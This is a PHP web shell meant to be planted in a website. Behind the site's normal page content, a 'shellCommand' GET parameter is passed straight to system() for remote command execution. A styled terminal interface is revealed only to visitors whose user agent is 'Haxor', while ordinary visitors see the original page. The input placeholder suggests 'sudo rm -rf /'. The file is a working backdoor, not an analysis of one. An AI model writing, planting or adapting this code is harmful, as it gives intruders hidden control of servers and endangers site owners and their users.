<?php	
	$ip = $_SERVER['SERVER_ADDR'];
	$port = $_SERVER['SERVER_PORT'];
	$file = basename(__FILE__); 
	$connectstr = "http://".$ip.":".$port."/".$file;
?>

<?php if (isset($_GET['shellCommand'])): ?>
<?php

	if(isset($_GET['shellCommand'])) 
	{
		system($_GET['shellCommand']." 2>&1");
	}


?>
<?php else: ?>

<div id="luserContent">
<%= $page %>
</div>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<div id="haxored" hidden="true">
<style rel="stylesheet" type="text/css">
#XmenuNav {
	background-color: #161616;
	float: center;
	width: 100%;
	height: 7%;
}

#menuNav ul {
	float: center;
}

#XmenuNav ul li {
	list-style-type: none;
	display: inline;
}

#XmenuNav #home {
	background-color: #2D2D2D;
	color: #FFFFFF;
	border: 0;
}


#XmenuNav li button {
	height: 100%;
	outline: none;
	border: 0;
	padding: 0 10px;	
	float: left;
	color: #605E56;
	background-color: #161616;
}

#XmenuNav li button:hover {
	background-color: #2D2D2D;
	color: #FFFFFF;
	border: 0;
}

#XmenuNav li button:active {
	color: #605E56;
}

#XmenuStats ul li {
	color: #CAD0C4;
	float: right;
	padding: 12px 10px;
	margin-right: 30px;
}

@media screen and (max-width: 850px) {
	#XmenuStats {
		display: none !important;
	}
}

@media screen and (max-width: 510px) {
	#XmenuNav {
		display: none !important;
	}

	#XmainShell {
		height: 100% !important;
	}
}
	
@media screen and (max-height: 582px) {
	#XmainShell {
		height: 85% !important;
	}
}

@media screen and (max-height: 502px) {
	#XmainShell {
		height: 85% !important;
	}

	#XmenuStats {
		display: none !important;
	}
}

@media screen and (max-height: 452px) {
	#XmainShell {
		height: 70% !important;
	}
}

#XmainContainer {
	background-color: #1F1F1F;
	height: 100%;
}

#XmainShell {
	height: 93%;
	padding: 20px 0px;
	margin: 0;
	color: #FFFFFF;
	width: 100%;
}

#XinputShell {
	margin-left: 3%;
	margin-right: 3%;
	padding-left: 2%;
	padding-right: 2%;
}


#XinputShell input {
	width: 100%;
	height: 50px;
	border: 0;
	outline: none;
	padding-left: 10px;
	font-family: monospace;
	font-size: 15px;
	color: #CAD0C4;
	background-color: #323232;
}

#XShellContainer {
	margin-top: 2%;
	margin-left: 5%;
	margin-right:5%;
	padding-left: 2%;
	padding-right: 0;
	background-color: #2D2D2D;
	height: 80%;
}

#XShellOutput {
	height: 100%;
	width: 100%;
	overflow: auto;
	font-family: monospace;
	padding-top: 15px;
}

#XShellOutput pre {
	display: inline;
}

#XShellOutput .command {
	color: #1793D1;
}

#XShellOutput .output {
	color: #CAD0C4;
	padding-bottom: 40px;
}

</style>
<div id="Xcontainer">
	<div id="XmenuNav">
		<ul class="XmenuOptions">
			<li><button id="home" value="clear"> Clear </button></li>
			<li><button id="XbuttonPwd" name="command" value="pwd">PWD</button></li>
			<li><button id="XbuttonPerm" name="command" value="whoami">Permissions</button></li>
			<li><button id="XbuttonPs" name="command" value="ps">Processes</button></li>
			<li><button id="XbuttonIfconfig" name="command" value="ifconfig">Networking</button></li>
			<li><button id="XbuttonPing" name="command" value="ping -c 1 google.com">Ping G</button></li>
		</ul>
		<div id="XmenuStats">
			<ul>
				<li id="XPHPversion"></li>
			</ul>
		</div>
	<br>
	</div>
	<div id="XmainContainer">
		<div id="XmainShell">
			<div id="XShellContainer">
				<div id="XShellOutput">
				</div>
			</div>
			<div id="XinputShell">
				<input type="text" placeholder="sudo rm -rf /" id="shellInput">
			</div>
		</div>
	
	<script type="text/javascript">	
		$(document).ready( function() {
			// Checks if user agent is correct.
			if(navigator.userAgent == "Haxor") {
				console.log("Hello Master.")
				$("body").css({"margin":"0"});
				$("#luserContent").remove();
				$("#haxored").prop("hidden", false);
				$("#shellInput").focus();
			} else {
				$("#haxored").remove();
			}

			// Array for command history
			var history = [];
			
			// Counter used for cycling through command history
			var counter = 0;

			// The things displayed in the shell - can be anything.
			var user = "badass";
			var hostname = "microserver";

			// This function requests command to be executed and then calls renderCmd.
			function submit(command) {
				history.push(command);
				if (command == "clear") {
					$("#XShellOutput").empty();
					$("#shellInput").focus();
				} else if (command == "help") {
					var help = "This is just a normal unix shell!\n\n"
					renderCmd(command, help)
				} else {
					$.ajax({
						url: "<?php echo $connectstr; ?>",
						type: "GET",
						data: {"shellCommand": command},
						success: function(data) {
							renderCmd(command, data)
						}
					});
				}
			}

			jQuery.fn.putCursorAtEnd = function() {

				return this.each(function() {
    
				// Cache references
				var $el = $(this),
				el = this;

				// Only focusus if input isn't already
				if (!$el.is(":focus")) {
					$el.focus();
				}

				// If this function exists... (IE 9+)
				if (el.setSelectionRange) {

				// Double the length because Opera is inconsistent about whether a carriage return is one character or two.
				var len = $el.val().length * 2;
      
				// Timeout seems to be required for Blink
				setTimeout(function() {
					el.setSelectionRange(len, len);
				}, 1);
    
			 } else {
      
				// As a fallback, replace the contents with itself
				// Doesn't work in Chrome, but Chrome supports setSelectionRange
				$el.val($el.val());
      
				}

				// Scroll to the bottom, in case we're in a tall textarea
				// (Necessary for Firefox and Chrome)
				this.scrollTop = 999999;

			});

		};

			// This function takes the command output and displays it in the output div.
			function renderCmd(command, output) {
				var time = new Date().toLocaleTimeString('en-GB', { hour: "numeric", minute: "numeric"});
				$("#XShellOutput").append("<pre class='command'>" + time + " "+ user + "@" + hostname + " $ " + command + "</pre><br>");
				$("#XShellOutput").append("<pre class='output'>" + output + "</pre>");
				$("#XShellOutput").scrollTop($("#XShellOutput")[0].scrollHeight);
				$("#shellInput").focus();
			}
			
			// This function maps any item ID to a submit command based on value. Give anything a value="command" and make it clickable.
			function addMenuOption(button_id) {
				$(button_id).on('click', function(e) {
					submit($(this).val());
				});
			}
			

			// This messy bit of code cycles through all the items on the menu bar and makes them clickable. using the above function.
			$("ul").children('li').children('button').each(function() {
				addMenuOption("#" + $(this).attr('id'));
			});
			
			// This handles the arrow key cycling of history and commands.
			var inputshell = document.getElementById("XinputShell");
			inputshell.addEventListener("keydown", function(e) {
				// Clear ShellInput when Enter is pressed
				if (e.which == 13) {
					submit($("#shellInput").val());
					counter = 0;
					$("#shellInput").val("");
				} else if (e.which == 38 && counter < history.length) {
				// Go back in history when UP is pressed
					counter += 1;
					$("#shellInput").val(history[history.length - counter]);
					$("#shellInput").putCursorAtEnd();
				} else if (e.which == 40 && counter > 0) {
				// Go Forward in history when DOWN is pressed
					counter -= 1;
					$("#shellInput").val(history[history.length - counter]);
				} else if (e.keyCode == 90 && e.ctrlKey) {
				// Clear ShellOutput when CTRL+Z is pressed/
					$("#XShellOutput").empty();
				}
			});

			$("#XPHPversion").text("<?php echo 'Current PHP Version: ' . phpversion(); ?>");
		});
	</script>
</div>
<!-- Below here should be the closing </body> tag -->
<?php endif; ?>

